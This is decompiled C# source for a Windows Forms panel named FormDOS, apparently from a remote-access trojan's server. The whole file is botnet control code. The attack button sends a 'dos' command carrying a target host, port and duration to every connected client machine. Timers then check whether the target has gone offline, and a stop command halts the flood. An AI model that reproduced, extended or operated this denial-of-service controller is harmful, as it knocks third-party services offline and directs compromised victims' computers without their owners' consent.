using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x0200005B RID: 91
	public partial class FormDOS : DarkForm
	{
		// Token: 0x0600036F RID: 879 RVA: 0x0002095C File Offset: 0x0002095C
		public FormDOS()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000370 RID: 880 RVA: 0x00020998 File Offset: 0x00020998
		private void BtnAttack_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrWhiteSpace(this.txtHost.Text) || string.IsNullOrWhiteSpace(this.txtPort.Text) || string.IsNullOrWhiteSpace(this.txtTimeout.Text))
			{
				return;
			}
			try
			{
				if (!this.txtHost.Text.ToLower().StartsWith("http://"))
				{
					this.txtHost.Text = "http://" + this.txtHost.Text;
				}
				new Uri(this.txtHost.Text);
			}
			catch
			{
				return;
			}
			if (this.PlguinClients.Count > 0)
			{
				try
				{
					this.btnAttack.Enabled = false;
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Pac_ket").AsString = "dos";
					msgPack.ForcePathObject("Option").AsString = "postStart";
					msgPack.ForcePathObject("Host").AsString = this.txtHost.Text;
					msgPack.ForcePathObject("Port").AsString = this.txtPort.Text;
					msgPack.ForcePathObject("Timeout").AsString = this.txtTimeout.Text;
					foreach (Clients clients in this.PlguinClients)
					{
						this.selectedClients.Add(clients);
						ThreadPool.QueueUserWorkItem(new WaitCallback(clients.Send), msgPack.Encode2Bytes());
					}
					this.btnStop.Enabled = true;
					this.timespan = TimeSpan.FromSeconds((double)(Convert.ToInt32(this.txtTimeout.Text) * 60));
					this.stopwatch = new Stopwatch();
					this.stopwatch.Start();
					this.timer1.Start();
					this.timer2.Start();
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000371 RID: 881 RVA: 0x00020BE8 File Offset: 0x00020BE8
		private void BtnStop_Click(object sender, EventArgs e)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Pac_ket").AsString = "dos";
				msgPack.ForcePathObject("Option").AsString = "postStop";
				foreach (Clients @object in this.PlguinClients)
				{
					ThreadPool.QueueUserWorkItem(new WaitCallback(@object.Send), msgPack.Encode2Bytes());
				}
				this.selectedClients.Clear();
				this.btnAttack.Enabled = true;
				this.btnStop.Enabled = false;
				this.timer1.Stop();
				this.timer2.Stop();
				this.status = "is online";
			}
			catch
			{
			}
		}

		// Token: 0x06000372 RID: 882 RVA: 0x00020CDC File Offset: 0x00020CDC
		private void Timer1_Tick(object sender, EventArgs e)
		{
			this.Text = string.Format("DOS ATTACK:{0}    Status:host {1}", this.timespan.Subtract(TimeSpan.FromSeconds((double)this.stopwatch.Elapsed.Seconds)), this.status);
			if (this.timespan < this.stopwatch.Elapsed)
			{
				this.btnAttack.Enabled = true;
				this.btnStop.Enabled = false;
				this.timer1.Stop();
				this.timer2.Stop();
				this.status = "is online";
			}
		}

		// Token: 0x06000373 RID: 883 RVA: 0x00020D80 File Offset: 0x00020D80
		private void Timer2_Tick(object sender, EventArgs e)
		{
			try
			{
				WebRequest.Create(new Uri(this.txtHost.Text)).GetResponse().Dispose();
				this.status = "is online";
			}
			catch
			{
				this.status = "is offline";
			}
		}

		// Token: 0x06000374 RID: 884 RVA: 0x00020DE0 File Offset: 0x00020DE0
		private void FormDOS_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				foreach (Clients clients in this.PlguinClients)
				{
					clients.Disconnected();
				}
				this.PlguinClients.Clear();
				this.selectedClients.Clear();
			}
			catch
			{
			}
			base.Hide();
			base.Parent = null;
			e.Cancel = true;
		}

		// Token: 0x04000226 RID: 550
		private TimeSpan timespan;

		// Token: 0x04000227 RID: 551
		private Stopwatch stopwatch;

		// Token: 0x04000228 RID: 552
		private string status = "is online";

		// Token: 0x04000229 RID: 553
		public object sync = new object();

		// Token: 0x0400022A RID: 554
		public List<Clients> selectedClients = new List<Clients>();

		// Token: 0x0400022B RID: 555
		public List<Clients> PlguinClients = new List<Clients>();
	}
}
